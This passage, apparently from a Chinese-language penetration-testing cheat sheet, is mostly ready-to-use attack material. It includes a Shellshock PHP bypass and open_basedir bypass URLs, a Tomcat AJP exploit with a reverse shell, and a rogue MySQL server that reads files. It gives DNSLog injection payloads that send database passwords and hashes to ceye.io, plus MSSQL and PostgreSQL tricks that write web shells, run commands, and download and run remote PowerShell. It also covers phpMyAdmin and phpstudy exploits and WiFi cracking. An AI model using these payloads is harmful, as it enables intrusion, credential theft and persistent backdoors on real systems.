class=\"token function\">mail</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"a@127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"-bv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$output</span> <span class=\"token operator\">=</span> @<span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>@<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$output</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token variable\">$output</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"No output, or not vuln.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">shellshock</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h2 id=\"-154\"><a class=\"anchor\" href=\"#-154\">#</a> </h2>\n<h3 id=\"蚁剑插件\"><a class=\"anchor\" href=\"#蚁剑插件\">#</a> 蚁剑插件</h3>\n<pre><code>01利用LD_PRELOAD环境变量\n02利用ShellShock（CVE-2014-6271）\n03利用Apache Mod CGI\n04 PHP-FPM利用LD_PRELOAD环境变量（同1）\n05攻击PHP-FPM监听端口\n06 Json Serializer UAF\n07具有特定析构函数UAF的PHP7 GC\n</code></pre>\n<h2 id=\"-155\"><a class=\"anchor\" href=\"#-155\">#</a> </h2>\n<h2 id=\"open_basedir绕过\"><a class=\"anchor\" href=\"#open_basedir绕过\">#</a> open_basedir 绕过</h2>\n<pre><code>第一种\nhttp://x.com/shell.php?a=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().' ');&#125;;\nhttp://x.com/shell.php?a=if%20(%20$b%20=%20opendir(%22glob:///var/www/html/*.php%22)%20)%20&#123;while%20(%20($file%20=%20readdir($b))%20!==%20false%20)%20&#123;echo%20%22filename:%22.$file.%22\\n%22;&#125;closedir($b);&#125;\n第二种\nhttp://x.com/shell.php?a=ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');system('cat ../../../../../etc/passwd');\nhttp://x.com/shell.php?a=mkdir(%22/tmp/crispr%22);chdir(%27/tmp/crispr/%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);print_r(scandir(%27.%27))\n第三种\n命令执行绕过\n读文件\n?a=show_source('preload.php');\n?a=echo(readfile('preload.php'));\n?a=print_r(readfile('preload.php'));\n?a=echo(file_get_contents('preload.php'));\n?a=print_r(file_get_contents('preload.php'));\n</code></pre>\n<h2 id=\"-156\"><a class=\"anchor\" href=\"#-156\">#</a> </h2>\n<h2 id=\"tomcat-ajp-lfirce\"><a class=\"anchor\" href=\"#tomcat-ajp-lfirce\">#</a> Tomcat Ajp LFI&amp;RCE</h2>\n<pre><code>LFI\nhttps://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner\n&gt;python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.0.110 -p 8009 -f pass\n</code></pre>\n<p><img data-src=\"41.png\" alt=\"\" /></p>\n<pre><code>RCE\n&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.107 LPORT=12138 R &gt;/var/www/html/1.jpg\n配合目标文件上传传入服务器\n</code></pre>\n<p><img data-src=\"42.png\" alt=\"\" /></p>\n<pre><code>&gt;java -jar ajpfuzzer_v0.6.jar\n&gt;connect 192.168.0.110 8009\n&gt;forwardrequest 2 &quot;HTTP/1.1&quot; &quot;/index.jsp&quot; 192.168.0.107 192.168.0.107 porto 8009 false &quot;Cookie:AAAA=BBBB&quot;,&quot;Accept-Encoding:identity&quot; &quot;javax.servlet.include.request_uri:index.jsp&quot;,&quot;javax.servlet.include.path_info:/1.jpg&quot;,&quot;javax.servlet.include.servlet_path:/&quot;\n</code></pre>\n<p><img data-src=\"43.png\" alt=\"\" /></p>\n<h2 id=\"-157\"><a class=\"anchor\" href=\"#-157\">#</a> </h2>\n<h2 id=\"mysql连接文件读取\"><a class=\"anchor\" href=\"#mysql连接文件读取\">#</a> Mysql 连接文件读取</h2>\n<pre><code>https://github.com/Gifts/Rogue-MySql-Server\n客户端必须启用LOCAL-INFILE \n客户端支持非SSL连接\n目标web存在adminer等可检查数据库连接的脚本。\n攻击机本地运行python构造假mysql服务，使用目标web连接，读取文件。\n#coding=utf-8 \nimport socket\nimport logging\nlogging.basicConfig(level=logging.DEBUG)\nfilename=&quot;/etc/passwd&quot;\nsv=socket.socket()\nsv.bind((&quot;&quot;,3305))\nsv.listen(5)\nconn,address=sv.accept()\nlogging.info('Conn from: %r', address)\nconn.sendall(&quot;\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot;)\nconn.recv(9999)\nlogging.info(&quot;auth okay&quot;)\nconn.sendall(&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot;)\nconn.recv(9999)\nlogging.info(&quot;want file...&quot;)\nwantfile=chr(len(filename)+1)+&quot;\\x00\\x00\\x01\\xFB&quot;+filename\nconn.sendall(wantfile)\ncontent=conn.recv(9999)\nlogging.info(content)\nconn.close()\n</code></pre>\n<h2 id=\"-158\"><a class=\"anchor\" href=\"#-158\">#</a> </h2>\n<h2 id=\"mysql开启外连\"><a class=\"anchor\" href=\"#mysql开启外连\">#</a> Mysql 开启外连</h2>\n<pre><code>&gt;grant all privileges on user.* to user@&quot;%&quot; identified by &quot;P@ssw0rd&quot;;\n</code></pre>\n<h2 id=\"-159\"><a class=\"anchor\" href=\"#-159\">#</a> </h2>\n<h2 id=\"mssqlagent-job上线\"><a class=\"anchor\" href=\"#mssqlagent-job上线\">#</a> MSSQL&amp;Agent Job 上线</h2>\n<pre><code>USE msdb; EXEC dbo.sp_add_job @job_name = N'syspolicy_purge_now' ; EXEC sp_add_jobstep @job_name = N'syspolicy_purge_now', @step_name = N'syspolicy_purge_step1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(''http://IP_OR_HOSTNAME/file''))&quot;', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'syspolicy_purge_now '; EXEC dbo.sp_start_job N'syspolicy_purge_now ';\n使用在注入点处，使用burp进行url编码，编码后前面加%20(空格URL编码)\n</code></pre>\n<h2 id=\"-160\"><a class=\"anchor\" href=\"#-160\">#</a> </h2>\n<h2 id=\"注入无列名\"><a class=\"anchor\" href=\"#注入无列名\">#</a> 注入无列名</h2>\n<pre><code>http://url/index.php?id=1 order by 6\nhttp://url/index.php?id=-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -\nhttp://url/index.php?id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -\n</code></pre>\n<h2 id=\"-161\"><a class=\"anchor\" href=\"#-161\">#</a> </h2>\n<h2 id=\"dnslog\"><a class=\"anchor\" href=\"#dnslog\">#</a> DNSLog</h2>\n<pre><code>http://ceye.io\nhttp://www.dnslog.cn/\n</code></pre>\n<h2 id=\"-162\"><a class=\"anchor\" href=\"#-162\">#</a> </h2>\n<h3 id=\"注入\"><a class=\"anchor\" href=\"#注入\">#</a> 注入</h3>\n<h2 id=\"-163\"><a class=\"anchor\" href=\"#-163\">#</a> </h2>\n<h2 id=\"-164\"><a class=\"anchor\" href=\"#-164\">#</a> </h2>\n<h2 id=\"mysql-3\"><a class=\"anchor\" href=\"#mysql-3\">#</a> MYSQL</h2>\n<pre><code>显示数据库\n?id=1' and if((select load_file(concat('\\\\\\\\',(select database()),'.jhsefs.ceye.io\\\\sql_test'))),1,0)--+\n显示数据库\n?id=1' and if((select load_file(concat('\\\\\\\\',(select schema_name from information_schema.schemata limit &#123;0&#125;,1),'.jhsefs.ceye.io\\\\sql_test'))),1,0)--+\n显示表\n?id=1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema='dbname' limit 0,1),'.jhsefs.ceye.io\\\\sql_test'))),1,0)--+\n?id=1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=0x1x1x2x limit 0,1),'.jhsefs.ceye.io\\\\sql_test'))),1,0)--+\n显示字段\n?id=1' and if((select load_file(concat('\\\\\\\\',(select column_name from information_schema.columns where table_name='users' limit 0,1),'.jhsefs.ceye.io\\\\sql_test'))),1,0)--+\n显示数据\n?id=1' and if((select load_file(concat('\\\\\\\\',(select hex(user) from users limit 0,1),'.jhsefs.ceye.io\\\\sql_test'))),1,0)--+\n</code></pre>\n<h2 id=\"-165\"><a class=\"anchor\" href=\"#-165\">#</a> </h2>\n<h2 id=\"-166\"><a class=\"anchor\" href=\"#-166\">#</a> </h2>\n<h2 id=\"mssql-3\"><a class=\"anchor\" href=\"#mssql-3\">#</a> MSSQL</h2>\n<pre><code>查数据\n?id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) FROM test.dbo.test_user where [USER] = 'admin')%2b'.cece.nk40ci.ceye.io';EXEC('master..xp_dirtree &quot;\\'%2b@host%2b'\\foobar$&quot;');\nSa密码\n?id=1DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name='sa')+'.ip.port.b182oj.ceye.io';EXEC('master..xp_dirtree&quot;\\'+@host+'\\foobar$&quot;');\n执行命令\nexec master..xp_cmdshell &quot;whoami&gt;D:/temp%26%26certutil -encode D:/temp D:/temp2%26%26findstr /L /V &quot;&quot;CERTIFICATE&quot;&quot; D:/temp2&gt;D:/temp3&quot;;\nexec master..xp_cmdshell &quot;cmd /v /c&quot;&quot;set /p MYVAR=&lt; D:/temp3 %26%26 set FINAL=!MYVAR!.xxx.ceye.io %26%26 ping !FINAL!&quot;&quot;&quot;;\nexec master..xp_cmdshell &quot;del &quot;&quot;D:/temp&quot;&quot; &quot;&quot;D:/temp2&quot;&quot; &quot;&quot;D:/temp3&quot;&quot;&quot;;\n</code></pre>\n<h2 id=\"-167\"><a class=\"anchor\" href=\"#-167\">#</a> </h2>\n<h2 id=\"-168\"><a class=\"anchor\" href=\"#-168\">#</a> </h2>\n<h2 id=\"postgresql\"><a class=\"anchor\" href=\"#postgresql\">#</a> postgreSQL</h2>\n<pre><code>?id=1;DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGIN SELECT INTO query_result (select encode(pass::bytea,'hex') from test_user where id =1);exec_cmd := E'COPY table_output(content) FROM E\\'\\\\\\\\\\\\\\\\'||query_result||E'.pSQL.3.nk40ci.ceye.io\\\\\\\\foobar.txt\\'';EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();\n</code></pre>\n<h2 id=\"-169\"><a class=\"anchor\" href=\"#-169\">#</a> </h2>\n<h2 id=\"-170\"><a class=\"anchor\" href=\"#-170\">#</a> </h2>\n<h2 id=\"oracle\"><a class=\"anchor\" href=\"#oracle\">#</a> Oracle</h2>\n<pre><code>?id=1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.nk40ci.ceye.io') FROM sys.DUAL;\n?id=1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.nk40ci.ceye.io',80) FROM sys.DUAL;\n?id=1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.xx.nk40ci.ceye.io').GETCLOB() FROM sys.DUAL;\n?id=1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.ddd.nk40ci.ceye.io') FROM sys.DUAL;\n</code></pre>\n<h2 id=\"-171\"><a class=\"anchor\" href=\"#-171\">#</a> </h2>\n<h3 id=\"命令执行\"><a class=\"anchor\" href=\"#命令执行\">#</a> 命令执行</h3>\n<pre><code>&gt;curl http://0ox095.ceye.io/`whoami`\n&gt;ping `whoami`.b182oj.ceye.io\n&gt;ping %CD%.lfofz7.dnslog.cn \n&amp;\ncmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot;\n</code></pre>\n<h2 id=\"-172\"><a class=\"anchor\" href=\"#-172\">#</a> </h2>\n<h3 id=\"xxe-2\"><a class=\"anchor\" href=\"#xxe-2\">#</a> XXE</h3>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE root [\n&lt;!ENTITY % remote SYSTEM &quot;http://b182oj.ceye.io/xxe_test&quot;&gt;\n%remote;]&gt;\n&lt;root/&gt;\n</code></pre>\n<h2 id=\"-173\"><a class=\"anchor\" href=\"#-173\">#</a> </h2>\n<h3 id=\"struts\"><a class=\"anchor\" href=\"#struts\">#</a> Struts</h3>\n<pre><code>xx.action?redirect:http://b182oj.ceye.io/%25&#123;3*4&#125;\nxx.action?redirect:$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;'whoami'&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&quot;http://b182oj.ceye.io/result%3d&quot;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&quot;GET&quot;),%23http.connect(),%23http.getInputStream()&#125;\n</code></pre>\n<h2 id=\"-174\"><a class=\"anchor\" href=\"#-174\">#</a> </h2>\n<h3 id=\"weblogic\"><a class=\"anchor\" href=\"#weblogic\">#</a> weblogic</h3>\n<pre><code>/uddiexplorer/SearchPublicRegistries.jsp?operator=http://b182oj.ceye.io/test&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Businesslocation&amp;btnSubmit=Search\n</code></pre>\n<h2 id=\"-175\"><a class=\"anchor\" href=\"#-175\">#</a> </h2>\n<h3 id=\"resin\"><a class=\"anchor\" href=\"#resin\">#</a> Resin</h3>\n<pre><code>xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://b182oj.ceye.io/ssrf\n</code></pre>\n<h2 id=\"-176\"><a class=\"anchor\" href=\"#-176\">#</a> </h2>\n<h3 id=\"discuz-2\"><a class=\"anchor\" href=\"#discuz-2\">#</a> Discuz</h3>\n<pre><code>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo\n</code></pre>\n<h2 id=\"-177\"><a class=\"anchor\" href=\"#-177\">#</a> </h2>\n<h2 id=\"phpmyadmin\"><a class=\"anchor\" href=\"#phpmyadmin\">#</a> PHPMyadmin</h2>\n<h2 id=\"-178\"><a class=\"anchor\" href=\"#-178\">#</a> </h2>\n<h3 id=\"log\"><a class=\"anchor\" href=\"#log\">#</a> LOG</h3>\n<pre><code>show variables like '%general%';  #查看配置\nset global general_log = on;  #开启general log模式\nset global general_log_file = '/var/www/html/1.php'; \nselect '&lt;?php eval($_POST[cmd]);?&gt;'\n</code></pre>\n<h2 id=\"-179\"><a class=\"anchor\" href=\"#-179\">#</a> </h2>\n<h3 id=\"慢查询\"><a class=\"anchor\" href=\"#慢查询\">#</a> 慢查询</h3>\n<pre><code>show variables like '%slow%';\nset GLOBAL slow_query_log_file='C:/WWW/slow.php';\nset GLOBAL slow_query_log=on;\nset GLOBAL log_queries_not_using_indexes=on;\nselect '&lt;?php phpinfo();?&gt;' from mysql.db where sleep(10);\n</code></pre>\n<h2 id=\"-180\"><a class=\"anchor\" href=\"#-180\">#</a> </h2>\n<h3 id=\"任意文件读取\"><a class=\"anchor\" href=\"#任意文件读取\">#</a> 任意文件读取</h3>\n<pre><code>phpMyAdmin 2.x\nPOST /scripts/setup.php HTTP/1.1\nHost: ip:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 80\n\naction=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;\n</code></pre>\n<h2 id=\"-181\"><a class=\"anchor\" href=\"#-181\">#</a> </h2>\n<h3 id=\"lfi\"><a class=\"anchor\" href=\"#lfi\">#</a> LFI</h3>\n<pre><code>phpMyAdmin 4.0.1--4.2.12，PHP &lt; 5.3.4\n/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=/../../../../phpinfo.txt%00\nphpMyAdmin 4.8.0和4.8.1 后台权限\n&gt;select '&lt;?php phpinfo();exit;?&gt;'\n/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_***\n</code></pre>\n<h2 id=\"-182\"><a class=\"anchor\" href=\"#-182\">#</a> </h2>\n<h3 id=\"rce\"><a class=\"anchor\" href=\"#rce\">#</a> RCE</h3>\n<pre><code>PhpMyAdmin 4.0.x-4.6.2，PHP 4.3.0-5.4.6后台权限\n&gt;cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system('ls -lua');&quot;\nphpMyAdmin 4.8.0~4.8.3\nCREATE DATABASE foo;\nCREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );\nINSERT INTO foo.bar SELECT '&lt;?php phpinfo(); ?&gt;';\n访问http://10.1.1.10/chk_rel.php?fixall_pmadb=1&amp;db=foo\nINSERT INTO pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop',\n'plop', 'plop', 'plop','../../../../../../../../tmp/sess_***','plop';\n访问\n/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[multi_edit][][]=baz&amp;clause_is_unique=1\n</code></pre>\n<h2 id=\"-183\"><a class=\"anchor\" href=\"#-183\">#</a> </h2>\n<h2 id=\"php-fpm-rce\"><a class=\"anchor\" href=\"#php-fpm-rce\">#</a> PHP-FPM RCE</h2>\n<pre><code>&gt;git clone https://github.com/neex/phuip-fpizdam.git\n&gt;cd phuip-fpizdam\n&gt;go get -v &amp;&amp; go build\n&gt;go run . http://127.0.0.1/index.php\nhttp://127.0.0.1/index.php?a=id\n多执行几次\n</code></pre>\n<h2 id=\"-184\"><a class=\"anchor\" href=\"#-184\">#</a> </h2>\n<h2 id=\"phpstudy后门\"><a class=\"anchor\" href=\"#phpstudy后门\">#</a> phpstudy 后门</h2>\n<pre><code>php:5.2.17   5.4.45\n\nGET / HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Encoding:gzip,deflate\nAccept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nContent-Length: 2\n</code></pre>\n<h2 id=\"-185\"><a class=\"anchor\" href=\"#-185\">#</a> </h2>\n<h2 id=\"cmdhijack\"><a class=\"anchor\" href=\"#cmdhijack\">#</a> cmdhijack</h2>\n<pre><code>From: https://hackingiscool.pl/\npoc完整的命令行\ncmd.exe /c &quot;ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe&quot;\n可能产生的影响\n包括拒绝服务，信息泄露，任意代码执行（取决于目标应用程序和系统）。\n以web应用为例\n</code></pre>\n<p><img data-src=\"660.png\" alt=\"\" /></p>\n<pre><code>由于使用了escapeshellcmd()，不易受命令注入的影响，使用本方法\n一个poc\n</code></pre>\n<p><img data-src=\"661.png\" alt=\"\" /><br />\n<img data-src=\"662.png\" alt=\"\" /></p>\n<pre><code>不限于任何位置，文件\n</code></pre>\n<p><img data-src=\"663.png\" alt=\"\" /></p>\n<pre><code>再扩展一下 \n如，powershell带-enc执行，或mshta等方法，可参考\nhttps://lolbas-project.github.io/，但是依照windows的特性，在无法将完整字符串解析为有效路径的情况下，会拆分空格后面的内容，这里可以使用&amp;符号\n如：\n&gt;cmd.exe /c &quot;cmd /c /../../../../../../../../../../windows/system32/calc&amp;powershell -enc xxxx&quot;\n&gt;cmd.exe /c &quot;cmd /c /../../../../../../../../../../windows/system32/calc&amp;mshta http://192.168.0.105:8080/xsuUEWJ.hta&quot;\n</code></pre>\n<p><img data-src=\"664.png\" alt=\"\" /></p>\n<h3 id=\"database\"><a class=\"anchor\" href=\"#database\">#</a> Database</h3>\n<h2 id=\"-186\"><a class=\"anchor\" href=\"#-186\">#</a> </h2>\n<h2 id=\"mssql-4\"><a class=\"anchor\" href=\"#mssql-4\">#</a> MSSQL</h2>\n<pre><code>判断数据库\n;and (select count(*) from sysobjects)&gt;0 mssql\n;and (select count(*) from msysobjects)&gt;0 access\n查库\n?id=1 and (SELECT top 1 Name FROM Master..SysDatabases)&gt;0 --\n?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in ('master'))&gt;0 --\n查表\nimport requests\nimport re\n\ntable_list = ['']\n\ndef get_sqlserver_table(table_list, table_num):\n\tfor num in range(0,table_num):\n\t\t# print(&quot;','&quot;.join(table_list))\n\t\tsql_str = &quot;and (select top 1 name from [xxxx].sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('&#123;&#125;'))&gt;0&quot;.format(&quot;','&quot;.join(table_list))\n\t\turl = &quot;http://www.xxxxx.cn/x.aspx?cid=1' &#123;&#125; AND 'aNmV'='aNmV&quot;.format(sql_str)\n\t\tr = requests.get(url, headers = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'&#125;)\n\t\tres = re.search(r'\\'(.*)\\'', r.content.decode('utf-8'),  re.M|re.I)\n\t\ttable_name = str(res.group(1))\n\t\ttable_list.append(table_name)\n\t\tprint(&quot;[&#123;&#125;] - TableName: &#123;&#125;&quot;.format(str(r.status_code), table_name))\nif __name__ == &quot;__main__&quot;:\n\tget_sqlserver_table(table_list, 16)\n\n判断是否存在xp_cmdshell\nand 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')\n执行命令\n;exec master..xp_cmdshell &quot;net user name password /add&quot;—\n查看权限\nand (select IS_SRVROLEMEMBER('sysadmin'))=1--  //sa\nand (select IS_MEMBER('db_owner'))=1--   //  dbo\nand (select IS_MEMBER('public'))=1--  //public\n站库分离获取服务器IP\n;insert into OPENROWSET('SQLOLEDB','uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;', 'select * from dest_table') select * from src_table;--\nLOG备份\n;alter database testdb set RECOVERY FULL --\n;create table cmd (a image) --\n;backup log testdb to disk = 'c:\\wwwroot\\shell.asp' with init --\n;insert into cmd (a) values ('&lt;%%25Execute(request(&quot;chopper&quot;))%%25&gt;')-- \n;backup log testdb to disk = 'c:\\wwwroot\\shell.asp' –\n2000差异备份\n;backup database testdb to disk ='c:\\wwwroot\\bak.bak';--\n;create table [dbo].[testtable] ([cmd] [image]);--\n;insert into testtable (cmd) values(木马hex编码);--\n;backup database testdb to disk='c:\\wwwroot\\upload\\shell.asp' WITH DIFFERENTIAL,FORMAT;--\n2005差异备份\n;alter/**/database/**/[testdb]/**/set/**/recovery/**/full—\n;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/database/**/[testdb]/**/to/**/disk=@d/**/with/**/init--\n;create/**/table/**/[itpro]([a]/**/image)—\n;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--\n;insert/**/into/**/[itpro]([a])/**/values(木马hex编码)—\n;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=木马保存路径的SQL_EN编码/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--\n;drop/**/table/**/[itpro]—\n;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--\n</code></pre>\n<h2 id=\"-187\"><a class=\"anchor\" href=\"#-187\">#</a> </h2>\n<h2 id=\"postgresql-2\"><a class=\"anchor\" href=\"#postgresql-2\">#</a> PostgreSQL</h2>\n<pre><code>连接\n&gt;psql -U dbuser -d exampledb -h 127.0.0.1 -p 5432\n查看版本\n&gt;select version();\n列出数据库\n&gt;select datname from pg_database;\n列出所有表名\n&gt;select * from pg_tables;\n读取账号秘密\n&gt;select usename,passwd from pg_shadow;\n当前用户\n&gt;select user;\n修改密码\n&gt;alter user postgres with password '123456';\n列目录\n&gt;select pg_ls_dir('/etc');\n读文件\n&gt;select pg_read_file('postgresql.auto.conf',0,100); #行数\n&amp;\n&gt;drop table wooyun;\n&gt;create table wooyun(t TEXT);\n&gt;copy wooyun FROM '/etc/passwd';\n&gt;select * from wooyun limit 1 offset 0;\n&amp;\n&gt;select lo_import('/etc/passwd',12345678);\n&gt;select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a;\n写文件\ncreate table shell(shell text not null);\ninsert into shell values($$&lt;?php @eval($_POST[1]);?&gt;$$);\ncopy shell(shell) to '/var/www/html/shell.php';\n&amp;\ncopy (select '&lt;?php phpinfo();?&gt;') to '/var/www/html/shell.php';\n爆破\nMSF&gt;use auxiliary/scanner/postgres/postgres_login\n执行命令版本8.2以下\n&gt;create function system(cstring) returns int AS '/lib/libc.so.6', 'system' language C strict;\n&gt;create function system(cstring) returns int AS '/lib64/libc.so.6', 'system' language C strict;\n&gt;select system('id');\n</code></pre>\n<h2 id=\"近源攻击\"><a class=\"anchor\" href=\"#近源攻击\">#</a> 近源攻击</h2>\n<h3 id=\"wi-fi破解\"><a class=\"anchor\" href=\"#wi-fi破解\">#</a> WI-FI 破解</h3>\n<h2 id=\"-188\"><a class=\"anchor\" href=\"#-188\">#</a> </h2>\n<h2 id=\"wifite\"><a class=\"anchor\" href=\"#wifite\">#</a> wifite</h2>\n<pre><code>Kali下工具wifite，加载网卡，开启监听模式，#airmon-ng check kill\n#airmon-ng start wlan1\n安装hcxtools v4.2.0或更高版本，hcxdumptool v4.2.0或更高版本\n#apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev\n#git clone https://github.com/ZerBea/hcxtools\n#cd hcxtools\n#make\n#make install \n#git clone https://github.com/ZerBea/hcxdumptool\n#cd hcxdumptool\n#make\n#make install\n#wifite –-dict /root/Desktop/wordlist.txt  加载\n</code></pre>\n<h2 id=\"-189\"><a class=\"anchor\" href=\"#-189\">#</a> </h2>\n<h2 id=\"aircrack-ng\"><a class=\"anchor\" href=\"#aircrack-ng\">#</a> Aircrack-ng</h2>\n<pre><code>#airmon-ng start wlan0 开启监听模式\n#airodump-ng wlan0mon  查看数据包\n#airodump-ng –c 1 –bssid APmac –w name wlan1mon保存某AP数据包\n#aireplay-ng –deauth 10 –a APmac wlan0mon  deauth攻击\n#aireplay-ng -0 